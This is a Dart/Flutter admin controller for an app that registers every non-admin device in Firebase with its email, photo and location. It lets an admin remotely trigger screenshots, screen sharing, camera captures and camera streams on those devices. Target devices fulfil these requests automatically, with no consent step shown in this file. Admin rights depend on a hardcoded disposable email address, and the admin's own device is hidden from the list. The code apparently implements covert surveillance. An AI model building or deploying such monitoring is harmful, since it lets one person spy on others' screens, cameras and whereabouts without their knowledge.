import 'dart:async';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:flutter/foundation.dart';
import 'package:get/get.dart';
import '../services/admin_service.dart';

class AdminDevice {
  final String deviceId;
  final String platform;
  final String username;
  final String? email;
  final String? photoUrl;
  final bool nativeCaptureEnabled;
  final DateTime? lastSeenAt;
  final double? latitude;
  final double? longitude;
  final double? accuracy;
  final DateTime? lastLocationTime;

  AdminDevice({
    required this.deviceId,
    required this.platform,
    required this.username,
    this.email,
    this.photoUrl,
    this.lastSeenAt,
    this.nativeCaptureEnabled = false,
    this.latitude,
    this.longitude,
    this.accuracy,
    this.lastLocationTime,
  });

  factory AdminDevice.fromSnapshot(
    DocumentSnapshot<Map<String, dynamic>> snapshot,
  ) {
    final data = snapshot.data() ?? <String, dynamic>{};
    final name = data['displayName'] as String? ??
        data['username'] as String? ??
        data['email'] as String? ??
        snapshot.id;

    final latRaw = data['latitude'];
    final lngRaw = data['longitude'];
    final accRaw = data['accuracy'];
    final locTimeRaw = data['lastLocationTime'];

    return AdminDevice(
      deviceId: snapshot.id,
      platform: data['platform'] as String? ?? 'unknown',
      username: name,
      email: data['email'] as String?,
      photoUrl: data['photoUrl'] as String?,
      nativeCaptureEnabled: data['nativeCaptureEnabled'] as bool? ?? false,
      lastSeenAt: (data['lastSeenAt'] as Timestamp?)?.toDate(),
      latitude: latRaw != null ? (latRaw as num).toDouble() : null,
      longitude: lngRaw != null ? (lngRaw as num).toDouble() : null,
      accuracy: accRaw != null ? (accRaw as num).toDouble() : null,
      lastLocationTime: locTimeRaw != null
          ? DateTime.fromMillisecondsSinceEpoch(locTimeRaw as int)
          : null,
    );
  }
}

class ScreenshotRequestItem {
  final String requestId;
  final String targetDeviceId;
  final String requestedByDeviceId;
  final String status;
  final String requestType;
  final String? screenshotUrl;
  final DateTime? requestedAt;
  final DateTime? completedAt;
  final DateTime? backgroundAttemptedAt;
  final String? error;
  final String? failureReason;

  ScreenshotRequestItem({
    required this.requestId,
    required this.targetDeviceId,
    required this.requestedByDeviceId,
    required this.status,
    required this.requestType,
    this.screenshotUrl,
    this.requestedAt,
    this.completedAt,
    this.backgroundAttemptedAt,
    this.error,
    this.failureReason,
  });

  factory ScreenshotRequestItem.fromSnapshot(
    DocumentSnapshot<Map<String, dynamic>> snapshot,
  ) {
    final data = snapshot.data() ?? <String, dynamic>{};
    return ScreenshotRequestItem(
      requestId: snapshot.id,
      targetDeviceId: data['targetDeviceId'] as String? ?? '',
      requestedByDeviceId: data['requestedByDeviceId'] as String? ?? '',
      status: data['status'] as String? ?? 'unknown',
      requestType: data['requestType'] as String? ?? 'screenshot',
      screenshotUrl: data['screenshotUrl'] as String?,
      requestedAt: (data['requestedAt'] as Timestamp?)?.toDate(),
      completedAt: (data['completedAt'] as Timestamp?)?.toDate(),
      backgroundAttemptedAt: (data['backgroundAttemptedAt'] as Timestamp?)?.toDate(),
      error: data['error'] as String?,
      failureReason: data['failureReason'] as String?,
    );
  }
}

class AdminController extends GetxController {
  final RxString currentDeviceId = ''.obs;
  final RxList<AdminDevice> devices = <AdminDevice>[].obs;
  final RxBool showOnlyNative = false.obs;
  final RxList<ScreenshotRequestItem> screenshotRequests =
      <ScreenshotRequestItem>[].obs;
  final RxBool isReady = false.obs;

  StreamSubscription<QuerySnapshot<Map<String, dynamic>>>? _devicesSubscription;
  StreamSubscription<QuerySnapshot<Map<String, dynamic>>>?
  _requestsSubscription;
  StreamSubscription<QuerySnapshot<Map<String, dynamic>>>?
  _incomingRequestsSubscription;

  Future<void> initialize() async {
    currentDeviceId.value = await AdminService.getOrCreateDeviceId();
    final currentUser = FirebaseAuth.instance.currentUser;
    if (currentUser != null && currentUser.email?.toLowerCase() == 'admin@yopmail.com') {
      try {
        final adminDevId = 'user_${currentUser.uid}';
        await FirebaseFirestore.instance.collection('devices').doc(adminDevId).delete();
      } catch (_) {}
    } else {
      await AdminService.registerDevice();
    }
    _listenToDevices();
    _listenToOwnRequests();
    _listenToIncomingRequests();
    isReady.value = true;
  }

  void _listenToDevices() {
    _devicesSubscription?.cancel();
    _devicesSubscription = AdminService.watchDevices().listen(
      (snapshot) {
        final rawList = snapshot.docs.map(AdminDevice.fromSnapshot).toList();
        rawList.sort((a, b) {
          final timeA = a.lastSeenAt ?? DateTime.now();
          final timeB = b.lastSeenAt ?? DateTime.now();
          return timeB.compareTo(timeA);
        });

        final Map<String, AdminDevice> uniqueMap = {};
        for (final dev in rawList) {
          final isOwnDevice = dev.deviceId == currentDeviceId.value;
          final isAdminEmail = dev.email?.toLowerCase() == 'admin@yopmail.com';
          final isAdminName = dev.username.trim().toLowerCase() == 'admin';
          if (isOwnDevice || isAdminEmail || isAdminName) {
            continue; // Exclude admin's own device from target list
          }

          final key = dev.username.trim().toLowerCase();
          if (!uniqueMap.containsKey(key)) {
            uniqueMap[key] = dev;
          } else {
            final existing = uniqueMap[key]!;
            if (dev.lastSeenAt != null && (existing.lastSeenAt == null || dev.lastSeenAt!.isAfter(existing.lastSeenAt!))) {
              uniqueMap[key] = dev;
            }
          }
        }
        devices.value = uniqueMap.values.toList();
      },
      onError: (error) {
        debugPrint('Admin device listener error: $error');
      },
    );
  }

  void _listenToOwnRequests() {
    _requestsSubscription?.cancel();
    _requestsSubscription = AdminService.watchOwnRequests(currentDeviceId.value)
        .listen(
          (snapshot) {
            final list = snapshot.docs
                .map(ScreenshotRequestItem.fromSnapshot)
                .toList();
            list.sort((a, b) {
              final aTime = a.requestedAt?.millisecondsSinceEpoch ?? 0;
              final bTime = b.requestedAt?.millisecondsSinceEpoch ?? 0;
              return bTime.compareTo(aTime);
            });
            screenshotRequests.value = list;
          },
          onError: (error) {
            debugPrint('Admin request listener error: $error');
          },
        );
  }

  void _listenToIncomingRequests() {
    _incomingRequestsSubscription?.cancel();
    _incomingRequestsSubscription =
        AdminService.watchPendingRequestsForDevice(
          currentDeviceId.value,
        ).listen(
          (snapshot) {
            for (final doc in snapshot.docs) {
              final requestType =
                  (doc.data()['requestType'] as String?) ?? 'screenshot';
              if (requestType == 'screen_share') {
                AdminService.fulfillScreenShareRequest(doc.id);
              } else if (requestType == 'camera_capture') {
                AdminService.fulfillCameraCaptureRequest(doc.id);
              } else if (requestType == 'camera_stream') {
                AdminService.fulfillScreenShareRequest(doc.id);
              } else {
                AdminService.fulfillScreenshotRequest(doc.id);
              }
            }
          },
          onError: (error) {
            debugPrint('Incoming screenshot listener error: $error');
          },
        );
  }

  Future<void> refreshDeviceList() async {
    final querySnapshot = await FirebaseFirestore.instance
        .collection('devices')
        .orderBy('lastSeenAt', descending: true)
        .get();
    devices.value = querySnapshot.docs.map(AdminDevice.fromSnapshot).toList();
  }

  Future<void> requestScreenshot(String targetDeviceId) async {
    if (targetDeviceId.isEmpty) return;
    await AdminService.sendScreenshotRequest(
      targetDeviceId,
      currentDeviceId.value,
    );
  }

  Future<void> requestScreenShare(String targetDeviceId) async {
    if (targetDeviceId.isEmpty) return;
    await AdminService.sendScreenShareRequest(
      targetDeviceId,
      currentDeviceId.value,
    );
  }

  Future<void> requestCameraCapture(
    String targetDeviceId, {
    required String cameraFacing,
  }) async {
    if (targetDeviceId.isEmpty) return;
    await AdminService.sendCameraCaptureRequest(
      targetDeviceId,
      currentDeviceId.value,
      cameraFacing: cameraFacing,
    );
  }

  Future<void> requestCameraStream(
    String targetDeviceId, {
    required String cameraFacing,
  }) async {
    if (targetDeviceId.isEmpty) return;
    await AdminService.sendCameraStreamRequest(
      targetDeviceId,
      currentDeviceId.value,
      cameraFacing: cameraFacing,
    );
  }

  Future<void> stopScreenShare(String requestId) async {
    if (requestId.isEmpty) return;
    await AdminService.stopScreenShareRequest(requestId);
  }

  Future<void> requestScreenshotForFiltered() async {
    final targets = devices
        .where(
          (d) =>
              d.deviceId != currentDeviceId.value &&
              (!showOnlyNative.value || d.nativeCaptureEnabled),
        )
        .toList();
    for (final t in targets) {
      await AdminService.sendScreenshotRequest(
        t.deviceId,
        currentDeviceId.value,
      );
    }
  }

  int get otherInstalledDevicesCount {
    return devices
        .where((device) => device.deviceId != currentDeviceId.value)
        .length;
  }

  @override
  void onClose() {
    _devicesSubscription?.cancel();
    _requestsSubscription?.cancel();
    _incomingRequestsSubscription?.cancel();
    super.onClose();
  }
}
